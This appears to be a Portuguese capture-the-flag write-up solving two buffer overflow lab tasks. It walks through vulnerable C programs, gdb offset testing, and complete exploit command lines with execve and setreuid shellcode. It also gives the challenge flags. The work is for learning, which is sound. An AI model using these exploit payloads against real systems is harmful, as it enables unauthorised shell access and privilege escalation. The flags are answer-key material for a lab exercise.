# [Buffer Overflows]
###### Resolvido por @SebastiaoKomada
> Desafio: Buffer Overflow

## Task 8 — Buffer Overflow 1

### Sobre o desafio  
O enunciado informa:  
> `Neste exemplo, na função copy_arg, podemos ver que a função strcpy está copiando a entrada de uma string (argv[1]) para um buffer de 140 bytes. Devido à natureza do strcpy, ela não verifica o tamanho da entrada, logo é possível provocar um estouro de buffer — podemos inserir dados maliciosos.`

O objetivo do desafio é explorar esse buffer overflow provocado pelo uso inseguro de `strcpy` em um buffer de 140 bytes.

---

## Solução

### Primeiros passos  
No diretório do exercício existem 3 arquivos.  
Ao tentar visualizar diretamente o `secret.txt` com `cat` obtemos:

```
cat: secret.txt: Permission denied
```

Ou seja, o usuário com o qual estamos conectados na VM não tem permissão para ler esse arquivo.

Em seguida analisamos o código em C:

```c
#include <stdio.h>
#include <stdlib.h>

void copy_arg(char *string)
{
    char buffer[140];
    strcpy(buffer, string);
    printf("%s\n", buffer);
    return 0;
}

int main(int argc, char **argv)
{
    printf("Here's a program that echo's out your input\n");
    copy_arg(argv[1]);
}
```

Ao executar o binário pela primeira vez, vemos que ele imprime a mensagem e, ao passar um argumento, ocorre **segmentation fault**, isso acontece quando o programa tenta acessar um endereço inválido ou não permitido.

Realizando a análise do binário com `gdb`. Abrimos o programa com:

```bash
gdb -q buffer-overflow
```
Como temos que provocar um estouro no buffer de 140 bytes, precisamos encontrar o offset até sobrescrever o RIP. Considerando o buffer de 140 bytes, o saved RBP (8 bytes) e eventual padding, testando tamanhos crescentes de entrada para descobrir o ponto em que o RIP é sobrescrito.

Executando:

```gdb
run $(python -c "print('A'*156)")
```

obtemos:

```
Here's a program that echo's out your input
AAA... (156 vezes)
Program received signal SIGSEGV, Segmentation fault.
0x0000000041414141 in ?? ()
```

Ou seja, o valor `0x41414141` mostra que os `A` chegaram a uma região usada como endereço de retorno.

Ao testar outros tamanhos, chegamos a:

```
Starting program: ... $(python -c "print('A'*159)")
Here's a program that echo's out your input
AAA... (159 vezes)
Program received signal SIGSEGV, Segmentation fault.
0x0000000000400563 in copy_arg ()
```

Isso indica que nos aproximamos do local de retorno. A partir desses testes determinamos o offset necessário para controlar o ponteiro de retorno e retornar ao início do nosso payload (shellcode).

---

### Construindo o payload

Ao totalizar 158 bytes para atingir o endereço de retorno correto e executar um shell para ler o `secret.txt`.

Calculei o tamanho do shellcode dado pelo exercício com:

```python
shellcode = len("\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05")
print(shellcode)
```

Resultado: `30` bytes.

Então a ideia foi: `30 (shellcode) + X (NOP sled) + Y (preenchimento/endereço) = 158`.

Optei por seguir a instrução do exercício para usar um NOP-sled e posicionar o endereço de retorno apontando para dentro do sled.

**Obs:** Não consegui montar um gerador com a forma `(NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory address)`, então pesquisei na internet algumas resoluções do mesmo exercício. Com isso, encontrei este payload de referência:

```bash
./buffer-overflow $(python -c "print('\x90'*90 + \
'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68' + \
'\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05' + \
'\x90'*22 + '\x98\xe2\xff\xff\xff\x7f')")
```

Neste payload há 90 bytes de NOP, mais o shellcode (cerca de 40 bytes neste exemplo) e um preenchimento seguido por um endereço (onde apontamos para dentro do NOP-sled).

Ao executar esse payload conseguimos criar um shell e usar `cat` para visualizar o `secret.txt`.

Listando arquivos em formato longo (`ll`) identificamos que o `user2` tem acesso ao `secret.txt`.

---

### Escalada de privilégios (setreuid)
**Obs:** Nao consegui prosseguir nesta etapa para dar permissões ao user, com a mesma resolução, prossegui com:

```bash
pwn shellcraft -f amd64.linux.setreuid 1002
```

Isso gerou bytes equivalentes a:

```
\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
```

Então a ideia foi juntar esse *setreuid* com o shellcode `/bin/sh`, reduzindo um pouco o espaço reservado para padding/endereço para não ultrapassar o limite de 158 bytes. O payload final foi:

```bash
./buffer-overflow $(python -c "print('\x90'*90 + \
'\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + \
'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68' + \
'\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05' + \
'\x90'*8 + '\x98\xe2\xff\xff\xff\x7f')")`
```

Com isso, obtivemos um shell com a identidade do `user2` e conseguimos ler o arquivo `secret.txt`.

---

## Flag encontrada

**Flag:** `omgyoudidthissocool!!`

# [Buffer Overflows]  
###### Resolvido por @SebastiaoKomada  
> Desafio: Buffer Overflow

## Task 9 - Buffer Overflow 2

### Sobre o desafio  
Da mesma forma que no exercício anterior, devemos explorar um estouro de buffer provocado pelo uso inseguro de funções de concatenação/cópia de strings para alcançar a flag.

---

## Solução

### Primeiros passos  
Ao tentar ler `secret.txt` com `cat` obtemos:

```
cat: secret.txt: Permission denied
```

Ou seja, o usuário atual não tem permissão de leitura do arquivo. Precisamos descobrir qual usuário tem acesso ao arquivo e inserir um stage de `setreuid` no payload para executar comandos com a identidade desse usuário.

Listando os arquivos com `ll` verificamos que **user3** é o responsável pela leitura do `secret.txt`.

Ao abrir o código fonte `buffer-overflow-2.c` vemos:

```c
#include <stdio.h>
#include <stdlib.h>

void concat_arg(char *string)
{
    char buffer[154] = "doggo";
    strcat(buffer, string);
    printf("new word is %s\n", buffer);
    return 0;
}

int main(int argc, char **argv)
{
    concat_arg(argv[1]);
}
```

Neste exercício o buffer tem 154 bytes, já inicializado com `"doggo"`. Devemos sobrescrever o retorno da função para controlar o fluxo e apontar para um payload injetado.

---

### Encontrando o offset

Usamos o `gdb` para abrir e testar tamanhos de entrada crescentes:

```gdb
gdb -q ./buffer-overflow-2
(gdb) run $(python -c "print('A'*165)")
```

Resultado:

```
new word is doggoAAAA... (165 As)
Program received signal SIGSEGV, Segmentation fault.
0x0000000000004141 in ?? ()
```

Testando com 169 bytes:

```gdb
(gdb) run $(python -c "print('A'*169)")
```

Resultado:

```
new word is doggoAAAA... (169 As)
Program received signal SIGSEGV, Segmentation fault.
0x0000414141414141 in ?? ()
```

A partir desses testes concluímos que o offset até sobrescrever o RIP é **169 bytes** (considerando o conteúdo inicial do buffer, saved RBP e padding observados por testes).

---

### Preparando o shellcode / setreuid

Como `user3` possui permissão para ler `secret.txt`, geramos um shellcode para ajustar a identidade efetiva do processo para esse usuário:

```bash
pwn shellcraft -f amd64.linux.setreuid 1003
```

Resultado (bytes):  
```
\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
```

---

### Payload final (referência)

**Obs:** Como não consegui montar o payload eu mesmo, obtive uma solução pronta como referência. O payload utilizado foi composto por:

- 90 bytes de NOP (`\x90`)
- 14 bytes de `setreuid` (conforme acima)
- ~40 bytes do shellcode `/bin/sh`
- 19 bytes de preenchimento/padding
- 6 bytes com o endereço de retorno (apontando para o NOP-sled)

Execução:

```bash
./buffer-overflow-2 $(python -c "print('\x90'*90 + \
'\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + \
'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68' + \
'\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05' + \
'\x90'*19 + '\x78\xe2\xff\xff\xff\x7f')") 
```

Ao executar o payload obtemos:

```
new word is doggo<binary garbage...>
sh-4.2$ 
sh-4.2$ cat secret.txt
wowanothertime!!
sh-4.2$
```

---

## Flag encontrada

**Flag:** `wowanothertime!!`

## Observações finais / lições aprendidas
- Em desafios de buffer overflow é comum determinar offsets experimentalmente (envio de padrões, análise em `gdb`/`radare2`) até descobrir onde o RIP é sobrescrito.  
- O uso de um NOP-sled facilita o posicionamento do endereço de retorno.  
- Incluir um *stage* para trocar UID/EGID é útil quando os arquivos alvo pertencem a outro usuário no sistema.  
- Sempre verifique o tamanho exato dos shellcodes (ex.: `setreuid`, `/bin/sh`) e ajuste o padding de acordo com o offset encontrado no binário. 
